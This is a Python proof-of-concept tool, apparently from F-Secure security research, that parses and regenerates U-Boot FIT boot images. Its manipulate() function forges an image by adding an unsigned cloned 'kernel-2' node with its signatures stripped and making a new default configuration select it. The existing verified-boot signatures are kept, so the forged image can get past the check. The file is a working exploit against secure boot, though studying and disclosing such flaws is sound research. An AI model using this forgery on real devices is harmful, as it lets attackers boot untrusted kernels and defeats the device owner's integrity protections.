#!/usr/bin/python3
# SPDX-License-Identifier: GPL-2.0
# Copyright (c) 2020, F-Secure Corporation, https://foundry.f-secure.com
#
# pylint: disable=E1101,W0201,C0103

"""
Verified boot image forgery tools and utilities

This module provides services to both take apart and regenerate FIT images
in a way that preserves all existing verified boot signatures, unless you
manipulate nodes in the process.
"""

import struct
import binascii
from io import BytesIO

#
# struct parsing helpers
#

class BetterStructMeta(type):
    """
    Preprocesses field definitions and creates a struct.Struct instance from them
    """
    def __new__(cls, clsname, superclasses, attributedict):
        if clsname != 'BetterStruct':
            fields = attributedict['__fields__']
            field_types = [_[0] for _ in fields]
            field_names = [_[1] for _ in fields if _[1] is not None]
            attributedict['__names__'] = field_names
            s = struct.Struct(attributedict.get('__endian__', '') + ''.join(field_types))
            attributedict['__struct__'] = s
            attributedict['size'] = s.size
        return type.__new__(cls, clsname, superclasses, attributedict)

class BetterStruct(metaclass=BetterStructMeta):
    """
    Base class for better structures
    """
    def __init__(self):
        for t, n in self.__fields__:
            if 's' in t:
                setattr(self, n, '')
            elif t in ('Q', 'I', 'H', 'B'):
                setattr(self, n, 0)

    @classmethod
    def unpack_from(cls, buffer, offset=0):
        """
        Unpack structure instance from a buffer
        """
        fields = cls.__struct__.unpack_from(buffer, offset)
        instance = cls()
        for n, v in zip(cls.__names__, fields):
            setattr(instance, n, v)
        return instance

    def pack(self):
        """
        Pack structure instance into bytes
        """
        return self.__struct__.pack(*[getattr(self, n) for n in self.__names__])

    def __str__(self):
        items = ["'%s': %s" % (n, repr(getattr(self, n))) for n in self.__names__ if n is not None]
        return '(' + ', '.join(items) + ')'

#
# some defs for flat DT data
#

class HeaderV17(BetterStruct):
    __endian__ = '>'
    __fields__ = [
        ('I', 'magic'),
        ('I', 'totalsize'),
        ('I', 'off_dt_struct'),
        ('I', 'off_dt_strings'),
        ('I', 'off_mem_rsvmap'),
        ('I', 'version'),
        ('I', 'last_comp_version'),
        ('I', 'boot_cpuid_phys'),
        ('I', 'size_dt_strings'),
        ('I', 'size_dt_struct'),
    ]

class RRHeader(BetterStruct):
    __endian__ = '>'
    __fields__ = [
        ('Q', 'address'),
        ('Q', 'size'),
    ]

class PropHeader(BetterStruct):
    __endian__ = '>'
    __fields__ = [
        ('I', 'value_size'),
        ('I', 'name_offset'),
    ]

# magical constants for DTB format
OF_DT_HEADER = 0xd00dfeed
OF_DT_BEGIN_NODE = 1
OF_DT_END_NODE = 2
OF_DT_PROP = 3
OF_DT_END = 9

class StringsBlock:
    """
    Represents a parsed device tree string block
    """
    def __init__(self, values=None):
        if values is None:
            self.values = []
        else:
            self.values = values

    def __getitem__(self, at):
        if isinstance(at, str):
            offset = 0
            for value in self.values:
                if value == at:
                    break
                offset += len(value) + 1
            else:
                self.values.append(at)
            return offset

        if isinstance(at, int):
            offset = 0
            for value in self.values:
                if offset == at:
                    return value
                offset += len(value) + 1
            raise IndexError('no string found corresponding to the given offset')

        raise TypeError('only strings and integers are accepted')

class Prop:
    """
    Represents a parsed device tree property
    """
    def __init__(self, name=None, value=None):
        self.name = name
        self.value = value

    def clone(self):
        return Prop(self.name, self.value)

    def __repr__(self):
        return "<Prop(name='%s', value=%s>" % (self.name, repr(self.value))

class Node:
    """
    Represents a parsed device tree node
    """
    def __init__(self, name=None):
        self.name = name
        self.props = []
        self.children = []

    def clone(self):
        o = Node(self.name)
        o.props = [x.clone() for x in self.props]
        o.children = [x.clone() for x in self.children]
        return o

    def __getitem__(self, index):
        return self.children[index]

    def __repr__(self):
        return "<Node('%s'), %s, %s>" % (self.name, repr(self.props), repr(self.children))

#
# flat DT to memory
#

def parse_strings(strings):
    """
    Converts the bytes into a StringsBlock instance so it is convenient to work with
    """
    strings = strings.split(b'\x00')
    return StringsBlock(strings)

def parse_struct(stream):
    """
    Parses DTB structure(s) into a Node or Prop instance
    """
    tag = bytearray(stream.read(4))[3]
    if tag == OF_DT_BEGIN_NODE:
        name = b''
        while b'\x00' not in name:
            name += stream.read(4)
        name = name.rstrip(b'\x00')
        node = Node(name)

        item = parse_struct(stream)
        while item is not None:
            if isinstance(item, Node):
                node.children.append(item)
            elif isinstance(item, Prop):
                node.props.append(item)
            item = parse_struct(stream)

        return node

    if tag == OF_DT_PROP:
        h = PropHeader.unpack_from(stream.read(PropHeader.size))
        length = (h.value_size + 3) & (~3)
        value = stream.read(length)[:h.value_size]
        prop = Prop(h.name_offset, value)
        return prop

    if tag in (OF_DT_END_NODE, OF_DT_END):
        return None

    raise ValueError('unexpected tag value')

def read_fdt(fp):
    """
    Reads and parses the flattened device tree (or derivatives like FIT)
    """
    header = HeaderV17.unpack_from(fp.read(HeaderV17.size))
    if header.magic != OF_DT_HEADER:
        raise ValueError('invalid magic value %08x; expected %08x' % (header.magic, OF_DT_HEADER))
    # TODO: read/parse reserved regions
    fp.seek(header.off_dt_struct)
    structs = fp.read(header.size_dt_struct)
    fp.seek(header.off_dt_strings)
    strings = fp.read(header.size_dt_strings)
    strblock = parse_strings(strings)
    root = parse_struct(BytesIO(structs))

    return root, strblock

#
# memory to flat DT
#

def compose_structs_r(item):
    """
    Recursive part of composing Nodes and Props into a bytearray
    """
    t = bytearray()

    if isinstance(item, Node):
        t.extend(struct.pack('>I', OF_DT_BEGIN_NODE))
        if isinstance(item.name, str):
            item.name = bytes(item.name, 'utf-8')
        name = item.name + b'\x00'
        if len(name) & 3:
            name += b'\x00' * (4 - (len(name) & 3))
        t.extend(name)
        for p in item.props:
            t.extend(compose_structs_r(p))
        for c in item.children:
            t.extend(compose_structs_r(c))
        t.extend(struct.pack('>I', OF_DT_END_NODE))

    elif isinstance(item, Prop):
        t.extend(struct.pack('>I', OF_DT_PROP))
        value = item.value
        h = PropHeader()
        h.name_offset = item.name
        if value:
            h.value_size = len(value)
            t.extend(h.pack())
            if len(value) & 3:
                value += b'\x00' * (4 - (len(value) & 3))
            t.extend(value)
        else:
            h.value_size = 0
            t.extend(h.pack())

    return t

def compose_structs(root):
    """
    Composes the parsed Nodes into a flat bytearray instance
    """
    t = compose_structs_r(root)
    t.extend(struct.pack('>I', OF_DT_END))
    return t

def compose_strings(strblock):
    """
    Composes the StringsBlock instance back into a bytearray instance
    """
    b = bytearray()
    for s in strblock.values:
        b.extend(s)
        b.append(0)
    return bytes(b)

def write_fdt(root, strblock, fp):
    """
    Writes out a complete flattened device tree (or FIT)
    """
    header = HeaderV17()
    header.magic = OF_DT_HEADER
    header.version = 17
    header.last_comp_version = 16
    fp.write(header.pack())

    header.off_mem_rsvmap = fp.tell()
    fp.write(RRHeader().pack())

    structs = compose_structs(root)
    header.off_dt_struct = fp.tell()
    header.size_dt_struct = len(structs)
    fp.write(structs)

    strings = compose_strings(strblock)
    header.off_dt_strings = fp.tell()
    header.size_dt_strings = len(strings)
    fp.write(strings)

    header.totalsize = fp.tell()

    fp.seek(0)
    fp.write(header.pack())

#
# pretty printing / converting to DT source
#

def as_bytes(value):
    return ' '.join(["%02X" % x for x in value])

def prety_print_value(value):
    """
    Formats a property value as appropriate depending on the guessed data type
    """
    if not value:
        return '""'
    if value[-1] == b'\x00':
        printable = True
        for x in value[:-1]:
            x = ord(x)
            if x != 0 and (x < 0x20 or x > 0x7F):
                printable = False
                break
        if printable:
            value = value[:-1]
            return ', '.join('"' + x + '"' for x in value.split(b'\x00'))
    if len(value) > 0x80:
        return '[' + as_bytes(value[:0x80]) + ' ... ]'
    return '[' + as_bytes(value) + ']'

def pretty_print_r(node, strblock, indent=0):
    """
    Prints out a single node, recursing further for each of its children
    """
    spaces = '  ' * indent
    print((spaces + '%s {' % (node.name.decode('utf-8') if node.name else '/')))
    for p in node.props:
        print((spaces + '  %s = %s;' % (strblock[p.name].decode('utf-8'), prety_print_value(p.value))))
    for c in node.children:
        pretty_print_r(c, strblock, indent+1)
    print((spaces + '};'))

def pretty_print(node, strblock):
    """
    Generates an almost-DTS formatted printout of the parsed device tree
    """
    print('/dts-v1/;')
    pretty_print_r(node, strblock, 0)

#
# manipulating the DT structure
#

def manipulate(root, strblock):
    """
    Maliciously manipulates the structure to create a crafted FIT file
    """
    # locate /images/kernel-1 (frankly, it just expects it to be the first one)
    kernel_node = root[0][0]
    # clone it to save time filling all the properties
    fake_kernel = kernel_node.clone()
    # rename the node
    fake_kernel.name = b'kernel-2'
    # get rid of signatures/hashes
    fake_kernel.children = []
    # NOTE: this simply replaces the first prop... either description or data
    # should be good for testing purposes
    fake_kernel.props[0].value = b'Super 1337 kernel\x00'
    # insert the new kernel node under /images
    root[0].children.append(fake_kernel)

    # modify the default configuration
    root[1].props[0].value = b'conf-2\x00'
    # clone the first (only?) configuration
    fake_conf = root[1][0].clone()
    # rename and change kernel and fdt properties to select the crafted kernel
    fake_conf.name = b'conf-2'
    fake_conf.props[0].value = b'kernel-2\x00'
    fake_conf.props[1].value = b'fdt-1\x00'
    # insert the new configuration under /configurations
    root[1].children.append(fake_conf)

    return root, strblock

def main(argv):
    with open(argv[1], 'rb') as fp:
        root, strblock = read_fdt(fp)

    print("Before:")
    pretty_print(root, strblock)

    root, strblock = manipulate(root, strblock)
    print("After:")
    pretty_print(root, strblock)

    with open('blah', 'w+b') as fp:
        write_fdt(root, strblock, fp)

if __name__ == '__main__':
    import sys
    main(sys.argv)
# EOF
